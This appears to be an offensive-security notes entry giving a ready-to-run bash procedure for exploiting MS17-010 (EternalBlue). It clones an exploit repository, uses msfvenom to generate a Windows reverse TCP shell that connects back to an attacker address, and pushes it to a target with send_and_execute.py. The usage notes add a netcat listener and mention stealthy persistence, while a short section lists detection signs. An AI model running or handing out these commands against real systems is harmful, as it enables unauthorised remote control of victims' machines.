---
type: code
language: bash
verified: true
tags:
  - reverse-shell
  - payload
  - eternalblue
platforms:
  - Linux
  - Windows
validated: true
---

# ms17-010-reverse-shell-generation-and-deployment

## Code

```bash
git clone https://github.com/helviojunior/MS17-010

# generate a simple reverse shell to use
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
python2 send_and_execute.py 10.0.0.1 revshell.exe
```

## Description

This script clones the MS17-010 repository, generates a Windows reverse TCP shell payload using msfvenom, and deploys it to the target via the send_and_execute.py tool, providing an alternative to Metasploit for gaining remote access post-EternalBlue exploitation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| LHOST | Attacker's IP address for reverse connection | 10.10.10.10 |
| LPORT | Port for the reverse shell | 443 |
| 10.0.0.1 | Target IP for deployment | 10.0.0.1 |
| revshell.exe | Name of the generated payload file | revshell.exe |

## Usage

Run this in a Linux environment with git, msfvenom, and Python 2 installed. Start a listener (e.g., nc -lvnp 443) before execution. Use after confirming vulnerability to inject the shell during exploitation, ideal when Meterpreter fails or for stealthy persistence.

## Detection

- Monitor for msfvenom-generated binaries via AV signatures.
- Network traffic to high ports like 443 from SMB ports.
- Unusual git clones or Python executions in logs.
- File creation of .exe in temp directories on target.

## Related

- [[procedures/EternalBlue-SMB-Exploitation]]
- [[tools/Metasploit-Framework]]
